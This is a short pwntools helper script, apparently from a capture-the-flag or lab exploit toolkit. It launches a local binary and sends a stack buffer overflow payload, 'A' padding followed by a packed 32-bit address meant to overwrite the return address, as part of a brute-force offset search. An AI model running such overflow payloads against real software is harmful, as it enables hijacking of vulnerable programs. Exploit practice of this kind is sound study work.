from pwn import *
from termcolor import colored, cprint

# ***------------------------------***
#  This script is called by bruteForce
#  and is used to send an independent 
#  attempt if the program crashes. In 
#  bruteForce it will send another try
#  with +4 added to the payload size in
#  case it is able to overwrite the RA
#  rather than the EBP.
# ***------------------------------***

def launch(file_path, suffix, offset):
	io = process(file_path)
	
	payload = b'\x41'*offset + p32(suffix)

	io.sendline(payload)
	
	response = io.recv()
	try:
		response = response.decode()
	except:
		pass
	
	cprint( response, "cyan", attrs=["bold"])
	
	io.close()
